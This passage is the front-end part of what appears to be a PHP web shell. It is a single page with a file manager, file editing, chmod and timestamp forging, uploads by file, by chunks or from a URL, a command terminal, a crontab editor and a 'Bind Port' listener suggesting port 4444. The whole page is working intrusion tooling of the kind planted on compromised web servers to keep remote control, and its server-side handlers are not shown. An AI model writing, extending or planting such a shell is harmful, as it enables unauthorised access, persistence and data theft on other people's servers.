                                <button class="btn btn-sm" onclick="editFile('<?= addslashes($path) ?>')">✏️</button>
                                <?php endif; ?>
                                <button class="btn btn-sm" onclick="renameItem('<?= addslashes($path) ?>', '<?= addslashes($item) ?>')">🔄</button>
                                <button class="btn btn-sm" onclick="chmodItem('<?= addslashes($path) ?>')">🔐</button>
                                <button class="btn btn-sm" onclick="touchItem('<?= addslashes($path) ?>')">📅</button>
                                <button class="btn btn-sm btn-danger" onclick="deleteItem('<?= addslashes($path) ?>', '<?= addslashes($item) ?>')">🗑️</button>
                            </td>
                        </tr>
                        <?php
                    }
                } else {
                    echo '<tr><td colspan="5" style="text-align:center;padding:20px">Cannot read directory</td></tr>';
                }
                ?>
            </tbody>
        </table>
    </div>
</div>

<!-- MODALS -->
<div id="createModal" class="modal">
    <div class="modal-content">
        <span class="close" onclick="closeModal('createModal')">&times;</span>
        <h2>➕ Create New File/Folder</h2>
        <input type="text" id="createName" placeholder="Enter name..." style="width:70%">
        <select id="createType" style="width:25%">
            <option value="file">📄 File</option>
            <option value="folder">📁 Folder</option>
        </select>
        <br>
        <button class="btn" onclick="createItem()">CREATE</button>
    </div>
</div>

<div id="uploadModal" class="modal">
    <div class="modal-content">
        <span class="close" onclick="closeModal('uploadModal')">&times;</span>
        <h2>📤 Upload File</h2>
        
        <div class="tab-container">
            <div class="tab-buttons">
                <button class="tab-btn active" onclick="switchUploadTab('regular')">📤 Regular Upload</button>
                <button class="tab-btn" onclick="switchUploadTab('chunk')">✂️ Chunked Upload</button>
                <button class="tab-btn" onclick="switchUploadTab('url')">🔗 Upload from URL</button>
            </div>
            
            <!-- REGULAR UPLOAD -->
            <div class="tab-content active" id="tab-regular">
                <div class="upload-area" id="regularUploadArea">
                    <div style="font-size:48px;margin-bottom:10px">📁</div>
                    <div>Click or drag & drop file here</div>
                    <div style="font-size:11px;color:#888;margin-top:5px">Max size: <?= ini_get('upload_max_filesize') ?></div>
                    <input type="file" id="regularFileInput" style="display:none">
                </div>
                <div class="progress" style="display:none" id="regularProgressBar">
                    <div class="progress-bar" id="regularProgressBarInner" style="width:0%">Uploading...</div>
                </div>
                <div id="regularUploadStatus"></div>
            </div>
            
            <!-- CHUNKED UPLOAD -->
            <div class="tab-content" id="tab-chunk">
                <div class="upload-area" id="chunkUploadArea">
                    <div style="font-size:48px;margin-bottom:10px">📦</div>
                    <div>Click or drag & drop large file here</div>
                    <div style="font-size:11px;color:#888;margin-top:5px">For files larger than server limits (chunked: 1MB per chunk)</div>
                    <input type="file" id="chunkFileInput" style="display:none">
                </div>
                <div class="progress" style="display:none" id="chunkProgressBar">
                    <div class="progress-bar" id="chunkProgressBarInner">0%</div>
                </div>
                <div id="chunkUploadStatus"></div>
            </div>
            
            <!-- URL UPLOAD -->
            <div class="tab-content" id="tab-url">
                <div style="padding:20px;text-align:center">
                    <div style="font-size:48px;margin-bottom:10px">🌐</div>
                    <div style="margin-bottom:15px">Enter file URL to download directly to this directory</div>
                    <div class="url-input-group">
                        <input type="url" id="urlInput" placeholder="https://example.com/file.zip" style="flex:1">
                        <button class="btn" onclick="uploadFromUrl()" style="white-space:nowrap">📥 DOWNLOAD</button>
                    </div>
                </div>
                <div class="progress" style="display:none" id="urlProgressBar">
                    <div class="progress-bar" id="urlProgressBarInner" style="width:0%">Downloading...</div>
                </div>
                <div id="urlUploadStatus"></div>
            </div>
        </div>
    </div>
</div>

<div id="editModal" class="modal">
    <div class="modal-content">
        <span class="close" onclick="closeModal('editModal')">&times;</span>
        <h2>✏️ Edit: <span id="editFileName" style="color:#00ff00"></span></h2>
        <textarea id="editContent"></textarea>
        <br>
        <button class="btn" onclick="saveFile()">💾 SAVE</button>
        <input type="hidden" id="editFilePath">
    </div>
</div>

<div id="terminalModal" class="modal">
    <div class="modal-content">
        <span class="close" onclick="closeModal('terminalModal')">&times;</span>
        <h2>💻 Terminal 
            <span class="os-badge <?= $IS_WIN ? 'os-windows' : 'os-linux' ?>">
                <?= $IS_WIN ? 'CMD' : 'BASH' ?>
            </span>
        </h2>
        <div class="terminal">
            <div class="terminal-output" id="terminalOutput">Ready...\n</div>
            <div class="terminal-input">
                <span class="terminal-prompt"><?= $IS_WIN ? 'C:\\>' : '$' ?></span>
                <input type="text" id="terminalCmd">
                <button class="btn" onclick="execTerminal()">▶️</button>
            </div>
        </div>
    </div>
</div>

<div id="crontabModal" class="modal">
    <div class="modal-content">
        <span class="close" onclick="closeModal('crontabModal')">&times;</span>
        <h2>⏰ Crontab</h2>
        <button class="btn" onclick="loadCrontab()">📥 LOAD</button>
        <button class="btn" onclick="saveCrontab()">💾 SAVE</button>
        <textarea id="crontabContent"></textarea>
    </div>
</div>

<div id="bindModal" class="modal">
    <div class="modal-content">
        <span class="close" onclick="closeModal('bindModal')">&times;</span>
        <h2>🔌 Bind Port</h2>
        <input type="number" id="bindPort" placeholder="Port (e.g. 4444)">
        <button class="btn" onclick="bindPort()">START</button>
        <div class="terminal" id="bindOutput" style="min-height:200px">Waiting...</div>
    </div>
</div>

<script>
const currentDir = '<?= addslashes($currentDir) ?>';
const encCurrentDir = '<?= addslashes(encryptPath($currentDir)) ?>';
const isWindows = <?= $IS_WIN ? 'true' : 'false' ?>;
let activeUploadTab = 'regular';

function showAlert(msg, type = 'success') {
    const box = document.getElementById('alertBox');
    box.innerHTML = `<div class="alert alert-${type}">${msg}</div>`;
    setTimeout(() => box.innerHTML = '', 5000);
}

function showModal(id) { document.getElementById(id).style.display = 'block'; }
function closeModal(id) { document.getElementById(id).style.display = 'none'; }

function switchUploadTab(tab) {
    activeUploadTab = tab;
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    
    const buttons = document.querySelectorAll('.tab-btn');
    if (tab === 'regular') buttons[0].classList.add('active');
    else if (tab === 'chunk') buttons[1].classList.add('active');
    else if (tab === 'url') buttons[2].classList.add('active');
    
    document.getElementById('tab-' + tab).classList.add('active');
}

function createItem() {
    const name = document.getElementById('createName').value.trim();
    const type = document.getElementById('createType').value;
    if (!name) return showAlert('Enter name!', 'error');
    
    const fd = new FormData();
    fd.append('ajax', 'create');
    fd.append('dir', encCurrentDir);
    fd.append('name', name);
    fd.append('type', type);
    
    fetch('', {method: 'POST', body: fd})
        .then(r => r.json())
        .then(d => {
            showAlert(d.msg, d.status === 'ok' ? 'success' : 'error');
            if (d.status === 'ok') setTimeout(() => location.reload(), 1000);
        });
}

function deleteItem(path, name) {
    if (!confirm('Delete "' + name + '"?')) return;
    
    const fd = new FormData();
    fd.append('ajax', 'delete');
    fd.append('path', path);
    
    fetch('', {method: 'POST', body: fd})
        .then(r => r.json())
        .then(d => {
            showAlert(d.msg, d.status === 'ok' ? 'success' : 'error');
            if (d.status === 'ok') setTimeout(() => location.reload(), 1000);
        });
}

function renameItem(path, old) {
    const newName = prompt('Rename to:', old);
    if (!newName || newName === old) return;
    
    const sep = isWindows ? '\\' : '/';
    const newPath = path.substring(0, path.lastIndexOf(sep) + 1) + newName;
    
    const fd = new FormData();
    fd.append('ajax', 'rename');
    fd.append('old_path', path);
    fd.append('new_path', newPath);
    
    fetch('', {method: 'POST', body: fd})
        .then(r => r.json())
        .then(d => {
            showAlert(d.msg, d.status === 'ok' ? 'success' : 'error');
            if (d.status === 'ok') setTimeout(() => location.reload(), 1000);
        });
}

function chmodItem(path) {
    const perms = prompt('Permissions (e.g. 0755):', '0644');
    if (!perms) return;
    
    const fd = new FormData();
    fd.append('ajax', 'chmod');
    fd.append('path', path);
    fd.append('perms', perms);
    
    fetch('', {method: 'POST', body: fd})
        .then(r => r.json())
        .then(d => {
            showAlert(d.msg, d.status === 'ok' ? 'success' : 'error');
            if (d.status === 'ok') setTimeout(() => location.reload(), 1000);
        });
}

function touchItem(path) {
    const now = new Date();
    const str = now.getFullYear() + '-' + 
               String(now.getMonth() + 1).padStart(2, '0') + '-' + 
               String(now.getDate()).padStart(2, '0') + ' ' +
               String(now.getHours()).padStart(2, '0') + ':' +
               String(now.getMinutes()).padStart(2, '0') + ':' +
               String(now.getSeconds()).padStart(2, '0');
    
    const time = prompt('Datetime (YYYY-MM-DD HH:MM:SS):', str);
    if (!time) return;
    
    const fd = new FormData();
    fd.append('ajax', 'touch');
    fd.append('path', path);
    fd.append('time', time);
    
    fetch('', {method: 'POST', body: fd})
        .then(r => r.json())
        .then(d => {
            showAlert(d.msg, d.status === 'ok' ? 'success' : 'error');
            if (d.status === 'ok') setTimeout(() => location.reload(), 1000);
        });
}

function editFile(path) {
    showModal('editModal');
    const sep = isWindows ? '\\' : '/';
    document.getElementById('editFileName').textContent = path.split(sep).pop();
    document.getElementById('editFilePath').value = path;
    document.getElementById('editContent').value = 'Loading...';
    
    const fd = new FormData();
    fd.append('ajax', 'get_content');
    fd.append('path', path);
    
    fetch('', {method: 'POST', body: fd})
        .then(r => r.json())
        .then(d => {
            document.getElementById('editContent').value = d.status === 'ok' ? d.content : 'Error: ' + d.msg;
        });
}

function saveFile() {
    const path = document.getElementById('editFilePath').value;
    const content = document.getElementById('editContent').value;
    
    const fd = new FormData();
    fd.append('ajax', 'save_file');
    fd.append('path', path);
    fd.append('content', content);
    
    fetch('', {method: 'POST', body: fd})
        .then(r => r.json())
        .then(d => {
            showAlert(d.msg, d.status === 'ok' ? 'success' : 'error');
            if (d.status === 'ok') closeModal('editModal');
        });
}

// ==================== REGULAR UPLOAD ====================
const regularUploadArea = document.getElementById('regularUploadArea');
const regularFileInput = document.getElementById('regularFileInput');

regularUploadArea.onclick = () => regularFileInput.click();
regularUploadArea.ondragover = (e) => { e.preventDefault(); regularUploadArea.style.borderColor = '#00ff00'; };
regularUploadArea.ondragleave = () => { regularUploadArea.style.borderColor = '#0f0'; };
regularUploadArea.ondrop = (e) => {
    e.preventDefault();
    regularUploadArea.style.borderColor = '#0f0';
    if (e.dataTransfer.files.length > 0) handleRegularUpload(e.dataTransfer.files[0]);
};
regularFileInput.onchange = (e) => {
    if (e.target.files.length > 0) handleRegularUpload(e.target.files[0]);
};

function handleRegularUpload(file) {
    document.getElementById('regularProgressBar').style.display = 'block';
    document.getElementById('regularProgressBarInner').style.width = '0%';
    document.getElementById('regularProgressBarInner').textContent = 'Uploading...';
    document.getElementById('regularUploadStatus').innerHTML = '<strong>Uploading: ' + file.name + ' (' + formatSize(file.size) + ')</strong>';
    
    const fd = new FormData();
    fd.append('ajax', 'upload_regular');
    fd.append('regular_file', file);
    fd.append('target_dir', encCurrentDir);
    
    // Simulate progress since fetch doesn't provide upload progress natively
    let progressInterval = setInterval(() => {
        const bar = document.getElementById('regularProgressBarInner');
        let currentWidth = parseInt(bar.style.width) || 0;
        if (currentWidth < 90) {
            currentWidth += Math.random() * 10;
            bar.style.width = Math.min(currentWidth, 90) + '%';
            bar.textContent = Math.round(Math.min(currentWidth, 90)) + '%';
        }
    }, 300);
    
    fetch('', {method: 'POST', body: fd})
        .then(r => r.json())
        .then(d => {
            clearInterval(progressInterval);
            const bar = document.getElementById('regularProgressBarInner');
            
            if (d.status === 'ok') {
                bar.style.width = '100%';
                bar.textContent = '100%';
                document.getElementById('regularUploadStatus').innerHTML = '<strong style="color:#0f0">✓ Complete! ' + d.file_name + ' (' + d.size + ')</strong>';
                showAlert(d.msg, 'success');
                setTimeout(() => { closeModal('uploadModal'); location.reload(); }, 2000);
            } else {
                bar.style.width = '0%';
                bar.textContent = 'Failed';
                document.getElementById('regularUploadStatus').innerHTML = '<strong style="color:#f00">✗ ' + d.msg + '</strong>';
                showAlert(d.msg, 'error');
            }
            regularFileInput.value = '';
        })
        .catch(err => {
            clearInterval(progressInterval);
            document.getElementById('regularProgressBarInner').style.width = '0%';
            document.getElementById('regularProgressBarInner').textContent = 'Error';
            document.getElementById('regularUploadStatus').innerHTML = '<strong style="color:#f00">✗ Network error</strong>';
            showAlert('Upload failed: Network error', 'error');
            regularFileInput.value = '';
        });
}

// ==================== CHUNKED UPLOAD ====================
const chunkUploadArea = document.getElementById('chunkUploadArea');
const chunkFileInput = document.getElementById('chunkFileInput');

chunkUploadArea.onclick = () => chunkFileInput.click();
chunkUploadArea.ondragover = (e) => { e.preventDefault(); chunkUploadArea.style.borderColor = '#00ff00'; };
chunkUploadArea.ondragleave = () => { chunkUploadArea.style.borderColor = '#0f0'; };
chunkUploadArea.ondrop = (e) => {
    e.preventDefault();
    chunkUploadArea.style.borderColor = '#0f0';
    if (e.dataTransfer.files.length > 0) handleChunkedUpload(e.dataTransfer.files[0]);
};
chunkFileInput.onchange = (e) => {
    if (e.target.files.length > 0) handleChunkedUpload(e.target.files[0]);
};

function handleChunkedUpload(file) {
    const chunkSize = 1024 * 1024;
    const totalChunks = Math.ceil(file.size / chunkSize);
    
    document.getElementById('chunkProgressBar').style.display = 'block';
    document.getElementById('chunkUploadStatus').innerHTML = '<strong>Uploading (Chunked): ' + file.name + ' (' + formatSize(file.size) + ')</strong>';
    
    let currentChunk = 0;
    
    function uploadChunk() {
        const start = currentChunk * chunkSize;
        const end = Math.min(start + chunkSize, file.size);
        const chunk = file.slice(start, end);
        
        const fd = new FormData();
        fd.append('ajax', 'upload_chunk');
        fd.append('chunk', chunk);
        fd.append('target_dir', encCurrentDir);
        fd.append('file_name', file.name);
        fd.append('chunk_index', currentChunk);
        fd.append('total_chunks', totalChunks);
        
        fetch('', {method: 'POST', body: fd})
            .then(r => r.json())
            .then(d => {
                if (d.status === 'error') {
                    document.getElementById('chunkUploadStatus').innerHTML = '<strong style="color:#f00">✗ ' + d.msg + '</strong>';
                    showAlert('Chunked upload failed: ' + d.msg, 'error');
                    document.getElementById('chunkProgressBarInner').style.width = '0%';
                    document.getElementById('chunkProgressBarInner').textContent = 'Failed';
                    chunkFileInput.value = '';
                    return;
                }
                
                const prog = d.progress || ((currentChunk + 1) / totalChunks * 100).toFixed(2);
                document.getElementById('chunkProgressBarInner').style.width = prog + '%';
                document.getElementById('chunkProgressBarInner').textContent = prog + '%';
                
                if (d.status === 'done') {
                    document.getElementById('chunkUploadStatus').innerHTML = '<strong style="color:#0f0">✓ Complete! ' + d.file_name + ' (' + d.size + ')</strong>';
                    showAlert(d.msg, 'success');
                    chunkFileInput.value = '';
                    setTimeout(() => { closeModal('uploadModal'); location.reload(); }, 2000);
                } else {
                    currentChunk++;
                    uploadChunk();
                }
            })
            .catch(err => {
                document.getElementById('chunkUploadStatus').innerHTML = '<strong style="color:#f00">✗ Network error</strong>';
                showAlert('Chunked upload failed: Network error', 'error');
                chunkFileInput.value = '';
            });
    }
    
    uploadChunk();
}

// ==================== UPLOAD FROM URL ====================
function uploadFromUrl() {
    const url = document.getElementById('urlInput').value.trim();
    if (!url) return showAlert('Enter URL!', 'error');
    
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
        return showAlert('Invalid URL! Must start with http:// or https://', 'error');
    }
    
    document.getElementById('urlProgressBar').style.display = 'block';
    document.getElementById('urlProgressBarInner').style.width = '0%';
    document.getElementById('urlProgressBarInner').textContent = 'Downloading...';
    document.getElementById('urlUploadStatus').innerHTML = '<strong>Downloading from: ' + url + '</strong>';
    
    let progressInterval = setInterval(() => {
        const bar = document.getElementById('urlProgressBarInner');
        let currentWidth = parseInt(bar.style.width) || 0;
        if (currentWidth < 85) {
            currentWidth += Math.random() * 5;
            bar.style.width = Math.min(currentWidth, 85) + '%';
            bar.textContent = Math.round(Math.min(currentWidth, 85)) + '%';
        }
    }, 500);
    
    const fd = new FormData();
    fd.append('ajax', 'upload_url');
    fd.append('target_dir', encCurrentDir);
    fd.append('url', url);
    
    fetch('', {method: 'POST', body: fd})
        .then(r => r.json())
        .then(d => {
            clearInterval(progressInterval);
            const bar = document.getElementById('urlProgressBarInner');
            
            if (d.status === 'ok') {
                bar.style.width = '100%';
                bar.textContent = '100%';
                document.getElementById('urlUploadStatus').innerHTML = '<strong style="color:#0f0">✓ ' + d.msg + ' (' + d.size + ')</strong>';
                showAlert(d.msg, 'success');
                document.getElementById('urlInput').value = '';
                setTimeout(() => { closeModal('uploadModal'); location.reload(); }, 2000);
            } else {
                bar.style.width = '0%';
                bar.textContent = 'Failed';
                document.getElementById('urlUploadStatus').innerHTML = '<strong style="color:#f00">✗ ' + d.msg + '</strong>';
                showAlert(d.msg, 'error');
            }
        })
        .catch(err => {
            clearInterval(progressInterval);
            document.getElementById('urlProgressBarInner').style.width = '0%';
            document.getElementById('urlProgressBarInner').textContent = 'Error';
            document.getElementById('urlUploadStatus').innerHTML = '<strong style="color:#f00">✗ Network error</strong>';
            showAlert('Download failed: Network error', 'error');
        });
}

// ==================== TERMINAL ====================
document.getElementById('terminalCmd').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') execTerminal();
});

function execTerminal() {
    const cmd = document.getElementById('terminalCmd').value.trim();
    if (!cmd) return;
    
    const output = document.getElementById('terminalOutput');
    const prompt = isWindows ? 'C:\\> ' : '$ ';
    output.textContent += '\n' + prompt + cmd + '\n';
    
    const fd = new FormData();
    fd.append('ajax', 'terminal');
    fd.append('cmd', cmd);
    
    fetch('', {method: 'POST', body: fd})
        .then(r => r.json())
        .then(d => {
            output.textContent += d.output + '\n';
            output.scrollTop = output.scrollHeight;
            document.getElementById('terminalCmd').value = '';
        });
}

function loadCrontab() {
    const ta = document.getElementById('crontabContent');
    ta.value = 'Loading...';
    
    const fd = new FormData();
    fd.append('ajax', 'crontab');
    fd.append('action', 'read');
    
    fetch('', {method: 'POST', body: fd})
        .then(r => r.json())
        .then(d => { ta.value = d.output; });
}

function saveCrontab() {
    const content = document.getElementById('crontabContent').value;
    
    const fd = new FormData();
    fd.append('ajax', 'crontab');
    fd.append('action', 'save');
    fd.append('content', content);
    
    fetch('', {method: 'POST', body: fd})
        .then(r => r.json())
        .then(d => { showAlert('Crontab saved: ' + d.output, 'success'); });
}

function bindPort() {
    const port = document.getElementById('bindPort').value;
    if (!port) return showAlert('Enter port!', 'error');
    
    const output = document.getElementById('bindOutput');
    output.textContent = 'Starting...\n';
    
    const fd = new FormData();
    fd.append('ajax', 'bind');
    fd.append('port', port);
    
    fetch('', {method: 'POST', body: fd})
        .then(r => r.json())
        .then(d => {
            output.textContent += '\n' + d.output;
            showAlert('Bind executed', 'success');
        });
}

function formatSize(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// Reset upload modals when closed
const uploadModal = document.getElementById('uploadModal');
const observer = new MutationObserver((mutations) => {
    mutations.forEach((mutation) => {
        if (mutation.target.style.display === 'none') {
            // Reset regular
            document.getElementById('regularProgressBar').style.display = 'none';
            document.getElementById('regularProgressBarInner').style.width = '0%';
            document.getElementById('regularUploadStatus').innerHTML = '';
            regularFileInput.value = '';
            // Reset chunk
            document.getElementById('chunkProgressBar').style.display = 'none';
            document.getElementById('chunkProgressBarInner').style.width = '0%';
            document.getElementById('chunkProgressBarInner').textContent = '0%';
            document.getElementById('chunkUploadStatus').innerHTML = '';
            chunkFileInput.value = '';
            // Reset url
            document.getElementById('urlProgressBar').style.display = 'none';
            document.getElementById('urlProgressBarInner').style.width = '0%';
            document.getElementById('urlUploadStatus').innerHTML = '';
            document.getElementById('urlInput').value = '';
        }
    });
});
observer.observe(uploadModal, { attributes: true, attributeFilter: ['style'] });

window.onclick = (e) => {
    if (e.target.classList.contains('modal')) e.target.style.display = 'none';
};
</script>
</body>
</html>